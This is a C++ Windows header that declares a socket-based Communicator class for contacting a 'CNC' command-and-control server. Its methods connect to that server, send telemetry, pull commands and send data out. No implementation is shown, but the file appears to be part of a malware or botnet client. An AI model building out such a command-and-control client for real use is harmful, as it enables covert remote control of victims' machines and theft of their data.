#pragma once
#pragma warning(disable:4996) 

#include <WinSock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <string>

#pragma comment (lib, "Ws2_32.lib")

namespace CommunicationHandler {

	// Need to build the protobuf protocol structs.

	constexpr bool STATUS_SUCCESS = true;
	constexpr bool STATUS_FAILURE = false;

	class Communicator
	{
		private:
			const int MAXIMUM_CONNECTION_ATTEMPTS = 15;

			SOCKADDR_IN cncInformation = { 0 };
			SOCKET connectionSocket = INVALID_SOCKET;
			WSADATA wsaData = { 0 };
			WORD dllVersion = MAKEWORD(2, 2);

		public:
			Communicator(std::string cncIp, int cncPort);

			bool connectToCnc();
			void sendTelemetry();
			bool pullCommand(char* buffer, size_t bufferLength);
			bool sendDataToCnc(const char* buffer);
			bool disconnectFromCnc();

			~Communicator();
	};

}